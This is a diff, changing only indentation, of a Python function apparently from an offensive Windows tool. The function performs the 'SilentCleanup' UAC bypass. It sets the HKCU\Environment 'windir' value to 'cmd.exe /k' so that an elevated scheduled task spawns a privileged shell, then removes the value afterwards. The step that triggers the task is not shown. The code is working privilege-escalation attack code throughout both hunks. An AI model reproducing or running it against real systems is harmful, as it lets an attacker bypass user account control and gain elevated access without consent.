@@ -27,13 +27,13 @@ def silentcleanup():
 	print_info("Hijacking %windir% enviroment variable in HKCU\Environment")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Environment"))
+					os.path.join("Environment"))
 								
 		_winreg.SetValueEx(key,
-							"windir",
-							0,
-							_winreg.REG_SZ,
-							"cmd.exe /k")
+				"windir",
+				0,
+				_winreg.REG_SZ,
+				"cmd.exe /k")
 		_winreg.CloseKey(key)
 		print_success("Successfully created %windir% enviroment variable in HKCU\Environment")
 	except Exception as error:
@@ -56,12 +56,12 @@ def silentcleanup():
 	print_info("Removing %windir% enviroment variable")	
 	try:
 		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
-								"Environment",
-								0,
-								_winreg.KEY_ALL_ACCESS)
+					"Environment",
+					0,
+					_winreg.KEY_ALL_ACCESS)
 								
 		_winreg.DeleteValue(key,
-							"windir")
+				"windir")
 		print_success("Successfully removed %windir% enviroment variable")
 	except Exception as error:
 		print_error("Unable to remove %windir% enviroment variable")
